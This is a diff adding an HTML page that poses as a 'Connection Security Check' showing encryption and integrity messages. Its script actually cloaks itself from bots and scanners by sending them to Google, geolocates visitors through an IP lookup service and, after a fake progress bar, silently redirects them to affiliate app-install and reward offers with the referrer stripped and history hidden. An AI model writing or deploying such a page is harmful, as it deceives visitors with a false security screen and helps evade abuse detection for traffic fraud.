@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connection Security Check</title>
+    <style>
+        :root { --primary-blue: #2563eb; --light-grey: #f8fafc; }
+        body { margin: 0; font-family: -apple-system, system-ui, sans-serif; background: var(--light-grey); display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; color: #1e293b; }
+        .box { background: #ffffff; padding: 50px; border-radius: 20px; box-shadow: 0 15px 30px rgba(0, 0, 0, 0.04); text-align: center; max-width: 360px; width: 85%; border: 1px solid #e2e8f0; }
+        
+        /* Smooth Spinner */
+        .loader { width: 40px; height: 40px; border: 3px solid #f1f5f9; border-top-color: var(--primary-blue); border-radius: 50%; display: inline-block; animation: rotation 0.8s linear infinite; margin-bottom: 25px; }
+        @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        h1 { font-size: 1.2rem; font-weight: 600; margin: 0 0 8px; letter-spacing: -0.01em; }
+        p { font-size: 0.9rem; color: #64748b; line-height: 1.5; margin-bottom: 25px; }
+        
+        /* Stealth Progress Bar */
+        .progress-container { width: 100%; height: 5px; background: #f1f5f9; border-radius: 10px; overflow: hidden; }
+        .progress-fill { width: 0%; height: 100%; background: var(--primary-blue); transition: width 3.2s cubic-bezier(0.1, 0, 0.3, 1); }
+        .secure-tag { margin-top: 15px; font-size: 0.7rem; color: #cbd5e1; font-weight: 700; text-transform: uppercase; }
+    </style>
+</head>
+<body>
+
+    <div class="box">
+        <div class="loader"></div>
+        <h1>Verifying Connection</h1>
+        <p>Checking browser integrity and securing your route. Please wait...</p>
+        
+        <div class="progress-container">
+            <div class="progress-fill" id="bar"></div>
+        </div>
+        <div class="secure-tag">End-to-End Encryption Active</div>
+    </div>
+
+    <script>
+        async function initiateStealthRedirect() {
+            const bar = document.getElementById('bar');
+            setTimeout(() => bar.style.width = '100%', 100);
+
+            const ua = navigator.userAgent;
+            
+            // --- 1. BOT / SPY FILTER ---
+            // طرد الروبوتات وأدوات الفحص فوراً
+            if (/bot|googlebot|crawler|spider|robot|headless|lighthouse/i.test(ua)) {
+                window.location.replace("https://www.google.com");
+                return;
+            }
+
+            // --- 2. THE OFFERS VAULT ---
+            const tiktokCPI_86 = "https://mob.v8trck.com/click?pid=2&offer_id=86&sub2=u144592&sub5=s169a2363c689bd8cabe00531f&sub7=rfnull&sub8=rdnull&sub15=7563b0f76863&s1=69a2363c689bd8cabe00531f";
+            const operaGX_216 = "https://mob.v8trck.com/click?pid=2&offer_id=216&sub2=u144592&sub5=s169a2363c689bd8cabe00531f&sub7=rfnull&sub8=rdnull&sub15=7616e1a015b9&s1=69a2363c689bd8cabe00531f";
+            const globalFallback = "https://rewardorbit.com/r/eyJ0IjoidGlrdG9rLXNob3AiLCJ1IjoiNjlhMjM2M2M2ODliZDhjYWJlMDA1MzFmIiwiYSI6Ijc1MCIsInRzIjoxNzcyNDcxNDkyNzY2fQ";
+            const questerAndroid = "https://rewardorbit.com/r/eyJ0IjoicXVlc3RlciIsInUiOiI2OWEyMzYzYzY4OWJkOGNhYmUwMDUzMWYiLCJ0cyI6MTc3MjQ3MDExNDI0NX0";
+            const testerUp = "https://rewardorbit.com/r/eyJ0IjoidGVzdGVydXAtYiIsInUiOiI2OWEyMzYzYzY4OWJkOGNhYmUwMDUzMWYiLCJ0cyI6MTc3MjQ3MDExNDI0NX0";
+            const testStar = "https://rewardorbit.com/r/eyJ0IjoidGVzdHN0YXIiLCJ1IjoiNjlhMjM2M2M2ODliZDhjYWJlMDA1MzFmIiwidHMiOjE3NzI0NzAxMTQyNDV9";
+            const freeCash = "https://rewardorbit.com/r/eyJ0IjoiZnJlZWNhc2gtY3BpIiwidSI6IjY5YTIzNjNjNjg5YmQ4Y2FiZTAwNTMxZiIsInRzIjoxNzcyNDcwMTE0MjQ1fQ";
+
+            const links = {
+                "US": { "iphone": tiktokCPI_86, "android": questerAndroid, "desktop": operaGX_216 },
+                "AU": { "iphone": tiktokCPI_86, "android": testStar, "desktop": operaGX_216 },
+                "JP": { "iphone": tiktokCPI_86, "android": freeCash },
+                "GB": { "iphone": testerUp, "android": testerUp, "desktop": operaGX_216 },
+                "CA": { "iphone": testerUp, "android": testerUp, "desktop": operaGX_216 },
+                "DE": { "iphone": "https://rewardorbit.com/r/eyJ0IjoiZW1wZm9obGVuIn0=", "android": "https://mob.v8trck.com/click?pid=2&offer_id=18271" }
+            };
+
+            const tsCountries = ["IS", "LU", "FR", "NL", "NO", "FI", "BE", "DK", "NZ", "IE", "SE"];
+
+            // --- 3. PURE STEALTH DETECTION ---
+            let device = /android/i.test(ua) ? "android" : (/iphone|ipad|ipod/i.test(ua) ? "iphone" : "desktop");
+            let country = "XX";
+            try {
+                // استخدام API خارجي بسيط لمعرفة الدولة فقط دون تتبع بيانات أخرى
+                const geo = await fetch('https://ipapi.co/json/').then(r => r.json());
+                country = geo.country_code || "XX";
+            } catch (e) {}
+
+            // --- 4. TARGET SELECTION ---
+            let target = globalFallback;
+            if (links[country]) {
+                target = links[country][device] || links[country]["desktop"] || globalFallback;
+            } else if (tsCountries.includes(country) && device !== "desktop") {
+                target = testStar;
+            } else if (device === "desktop") {
+                target = operaGX_216;
+            }
+
+            // --- 5. THE CLEANEST REDIRECT (Referrer Stripping) ---
+            setTimeout(() => {
+                const a = document.createElement('a');
+                a.href = target;
+                a.rel = 'noreferrer'; // تصفير الـ Referrer تماماً
+                a.style.display = 'none';
+                document.body.appendChild(a);
+                
+                // التحويل بطريقة الـ Ghost: لا تترك أثراً في الـ Browser History
+                window.location.replace(target);
+                a.click();
+            }, 3200);
+        }
+
+        window.onload = initiateStealthRedirect;
+    </script>
+</body>
+</html>
